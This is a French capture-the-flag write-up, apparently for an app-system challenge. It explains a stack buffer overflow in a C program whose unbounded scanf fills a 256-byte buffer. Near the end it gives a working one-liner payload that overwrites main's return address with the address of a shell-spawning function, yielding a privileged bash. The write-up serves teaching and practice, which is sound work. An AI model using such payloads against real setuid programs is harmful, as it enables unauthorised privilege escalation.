
```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <unistd.h>

/*
gcc -o ch35 ch35.c -fno-stack-protector -no-pie -Wl,-z,relro,-z,now,-z,noexecstack
*/

void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}

int main(int argc, char **argv){

    char buffer[256];
    int len, i;

    scanf("%s", buffer);
    len = strlen(buffer);

    printf("Hello %s\n", buffer);

    return 0;
}

```

`scanf("%s", buffer);`

%s avec scanf lit une chaîne sans limite de taille (jusqu’à espace / newline).

buffer fait 256 octets.

Si tu tapes plus de 256 caractères, scanf continue d’écrire après buffer => débordement de pile (stack buffer overflow).


**Pourquoi callMeMaybe() est intéressante**

```
void callMeMaybe(){
    char *argv[] = { "/bin/bash", "-p", NULL };
    execve(argv[0], argv, NULL);
}

```


Cette fonction :

lance /bin/bash -p

donc si l’exécution saute dedans, tu obtiens un shell avec les privilèges du binaire.

## Idée de l’exploit

Objectif :

Envoyer une chaîne trop longue via scanf("%s", buffer);

Cette chaîne va :

remplir buffer avec du padding (genre 'A')

écraser len, i, saved RBP

puis écraser l’adresse de retour avec l’adresse de callMeMaybe.

Quand main se termine, il fait ret → au lieu de revenir à libc_start_main, il saute dans callMeMaybe.

callMeMaybe → execve("/bin/bash", "-p") → shell.

## Attaque

<img width="497" height="49" alt="image" src="https://github.com/user-attachments/assets/31c9ad21-3a2a-45f3-b63d-6fe6923b0e4c" />

On va simplement mettre l’adresse de la fonction callMeMaybe (0x00000000004006cd) dans la pile avec comme objectif l’écrasement de l’adresse de retour du main.
Pour éviter l’étape visant à rechercher la position exacte dans la pile de l’adresse de retour du main, on va simplement copier cette adresse partout.


`app-systeme-ch35@challenge03:~$ (python -c "print('\xcd\x06\x40\x00\x00\x00\x00\x00' * 50)" ; cat) | ./ch35`




